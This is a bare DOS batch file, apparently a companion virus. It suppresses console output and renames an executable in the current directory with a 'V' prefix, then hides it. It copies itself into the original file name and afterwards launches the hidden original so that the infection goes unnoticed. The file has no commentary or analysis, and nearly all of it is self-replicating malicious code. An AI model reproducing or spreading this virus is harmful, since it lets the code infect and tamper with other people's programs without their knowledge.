@echo off
ctty nul
for %%f in (*.exe *.com) do set A=%%f
if %A%==COMMAND.COM set A=
rename %A% V%A%
if not exist V%A% goto end
attrib +h V%A%
copy %0.bat %A%
attrib +r %A%
ren %A% *.bat
set A=
:end
ctty con
@if exist V%0.com V%0.com %1 %2 %3
@if exist V%0.exe V%0.exe %1 %2 %3
